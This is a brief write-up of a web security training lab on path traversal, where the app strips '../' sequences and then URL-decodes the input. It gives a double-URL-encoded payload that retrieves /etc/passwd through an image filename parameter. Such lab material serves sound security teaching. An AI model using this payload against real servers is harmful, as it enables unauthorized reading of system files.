Title: File path traversal, traversal sequences stripped with superfluous URL-decode
Level: Practitioner
Desc:  This lab contains a path traversal vulnerability in the display of product images.
The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.
To solve the lab, retrieve the contents of the /etc/passwd file. 


The app blocks patterns like: `../`, but knowing that it then decode URL, we can inject pattern `../` in URL encoding
payload: `/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`


![image](https://github.com/user-attachments/assets/09a88759-bcbe-403f-bab9-bd4be2d22b5e)
